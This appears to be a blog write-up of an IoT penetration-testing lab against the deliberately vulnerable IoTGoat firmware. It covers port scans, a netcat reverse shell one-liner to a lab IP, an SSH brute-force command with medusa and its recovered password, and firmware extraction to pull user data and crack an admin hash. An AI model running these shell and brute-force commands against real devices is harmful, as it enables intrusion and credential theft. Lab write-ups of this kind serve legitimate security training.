---
title: Practical IoT Security and Pentesting
description: Writeup of IoT Penetration Testing
date: 2025-04-04 03:00:00 -0500
categories: [IoT, Penetration Testing]
tags: [Nmap, IoTGoat, OWASP, Firmware, Binwalk, AttifyOS, FAT]
pin: true
math: true
mermaid: true
image:
  path: https://www.softwebsolutions.com/wp-content/uploads/2019/08/IoT-based-Asset-solutions-1.jpg
---

# <font color="red"><strong>Practical IoT Security and Penetration Testing</strong></font>

## <font color="red"><strong>What is IoT?</strong></font>

IoT is the network of physical objects or things embedded with electronics, software, sensors, and network connectivity, which enables these objects to collect and exchange data.

---

## <font color="red"><strong>Internet Evolution?</strong></font>

<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/1.png" width="738" height="423" alt="">

---

## <font color="red"><strong>Components of IoT</strong></font>

<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/2.png" width="500" height="500" alt="">
### <font color="orange"><strong>Sensors</strong></font>
They are input components that sense and collect data.

### <font color="orange"><strong>Actuators</strong></font>
They are output components that perform actions.

### <font color="orange"><strong>Communicators</strong></font>
They connect devices with each other and the cloud.

---

## <font color="red"><strong>Passive Reconnaissance in IoT Devices</strong></font>

### <font color="orange"><strong>Google Dorking</strong></font>

- **FCC ID**: A unique identifier for electronic devices.
  - _Important_: Devices using RF (WiFi, Bluetooth, etc.) must be approved by FCC.
  - [FCC Search](https://fcc.io)

### <font color="orange"><strong>Patents</strong></font>
- Search via Google Patents.

### <font color="orange"><strong>Search Engines</strong></font>
- Examples: **Shodan**, **Censys**

---

## <font color="red"><strong>IoT Penetration Testing</strong></font>

### <font color="orange"><strong>Practical Setup</strong></font>

<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/3.png" width="738" height="423" alt="">
Used **IoTGoat** for testing.

---

## <font color="red"><strong>Port Scanning</strong></font>

### <font color="orange"><strong>TCP Scan</strong></font>
```bash
nmap -sS -p- 192.168.190.144 -T5
```
This is the result of the scan : 
<center><img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/4.png" width="300" height="300" alt=""></center>
I also scan ports that are open on UDP mode by using this command : 
```bash
nmap -sS -p- -sV 192.168.190.144 -T5
```
<center><img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/5.png" width="300" height="300" alt=""></center>

---
## <font color="red"><strong>Exploitation :</strong></font>
### <font color="orange"><strong>Port 5515/TCP</strong></font>
I saw that 5515 is open so i tried to connect with netcat to see the result : 
### <strong>PoC : Proof of Concept</strong>
<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/6.png" width="738" height="423" alt="">
and booooooom i successfully get connected to it .
<center><img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/7.png" width="300" height="300" alt=""></center>
Then I tried to spawn a shell but i didn’t found python installed so i tried this command and get a reverse shell : *
```bash
mkfifo /tmp/s; /bin/sh -i </tmp/s 2>&1 | nc 192.168.190.129 4444 >/tmp/s
```
### <font color="orange"><strong>Port 65534/TCP</strong></font>
For this port i used the same thing that is connecting with netcat : 
<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/8.png" width="738" height="423" alt="">
But as we can see that we have a login here The first thing that i think about it is brute force attack . 
<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/9.png" width="738" height="423" alt="">
we can see the user that have a shell are the *root* and *uitgoatuser*. 
And I used medusa for this task :
```bash
medusa -u iotgoatuser -P /usr/share/john/password.lst -h 192.168.190.144 -M ssh
```
and BOOOOM this is  the password : 7ujMko0vizxv
<center><img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/9.png" width="300" height="300" alt=""></center>
---
## <font color="red"><strong>Extracting Firmware and Retrieving Sensitive Information : </strong></font>
### <font color="orange"><strong>What is Binwalk ?</strong></font>
Binwalk is a tool that is **for searching a given binary image for embedded files and executable code.**

By using this command :
```bash
binwalk -e IoTGoat-raspberry-pi2.img
```
this Directory is extracted
<center><img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/11.png" width="500" height="500" alt=""></center>
Squashfs is a compressed read-only file system for linux .
<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/12.png" width="500" height="500" alt="">
### <strong>Or : </strong>
Using this command we can find all db files :
```bash
find . -name *.db 2>/dev/null
```
<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/13.png" width="500" height="500" alt="">
using sqlitebrowser i can now the content of the file.db .
<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/14.png" width="500" height="500" alt="">
<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/15.png" width="500" height="500" alt="">
These are some email adresses and usernames . 
###<strong>And the same thing for config files .</strong>
---
## <font color="red"><strong>Analyzing a Real-World IoT Firmware</strong></font>
<img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/16.png" width="500" height="500" alt="">
and now let’s analyse it . 
NOW i used Binwalk by executing this command :
```bash
binwalk -e tl.bin
```
successfully extracted : 
<center><img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/17.png" width="200" height="200" alt=""></center>
Now i found a file called passwd.bak and this is something 
<center><img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/18.png" width="500" height="500" alt=""></center>
and i tried to crack the admin password . 
<center><img src="https://raw.githubusercontent.com/unkn0wnB0y5/unkn0wnB0y5.github.io/refs/heads/main/assets/Img/IoT_Pentesting/19.png" width="500" height="500" alt=""></center>
BOOOM .
---
## <font color="red"><strong>Attify OS</strong></font>
AttifyOS is a specialized Linux distribution designed to assist security professionals in conducting penetration testing and security assessments of Internet of Things (IoT) devices. 
## <font color="red"><strong> What is FAT (Firmware Analysis Toolkit)?</strong></font>
**FAT** = A collection of scripts and tools that help you:

- **Extract** a firmware image  
- **Emulate** the firmware using **QEMU**  
- **Interact** with the system (web interfaces, shells, services)  
- **Find vulnerabilities**

